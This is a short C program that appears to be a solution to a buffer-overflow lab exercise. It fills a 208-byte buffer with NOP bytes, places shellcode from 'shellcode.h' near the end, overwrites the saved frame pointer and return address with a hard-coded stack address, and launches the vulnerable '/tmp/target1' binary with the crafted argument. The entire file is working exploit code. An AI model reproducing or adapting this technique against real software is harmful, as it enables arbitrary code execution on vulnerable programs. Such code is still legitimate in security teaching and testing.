#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
int main(void)
{
  char *args[3];
  char *env[1];
  char buffer[208];

  int i;
  for (i = 0; i < 208; i++)
      buffer[i] = 0x90; //NOPS

  strcpy(buffer + 200 - 45, shellcode); // put the shellcode string in the end of the buffer
  long* tmp = (long*)(buffer + 200);
  *tmp = 0xffffffff; // empty
  tmp = (long*)(buffer + 204);
  *tmp = 0xbffffd38; // shellcode address

  args[0] = TARGET; args[1] = buffer; args[2] = NULL; env[0] = NULL;
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
